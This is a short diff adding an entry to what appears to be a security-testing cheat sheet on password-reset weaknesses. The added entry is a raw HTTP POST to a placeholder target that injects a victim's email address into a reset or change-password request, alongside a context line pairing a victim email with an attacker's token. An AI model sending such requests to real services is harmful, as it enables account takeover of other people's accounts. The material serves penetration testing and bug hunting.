@@ -150,3 +150,13 @@ email=victim@gmail.com&token=[attacker_token]&old_pass=a&new_pass=b
 
 
 ````
+#### Add Email parameter if there isn't email in request of reset/changepass
+````
+POST /reset/change
+Host: target.com
+
+
+added="email:victim@gmail.com"&token=token
+
+````
+
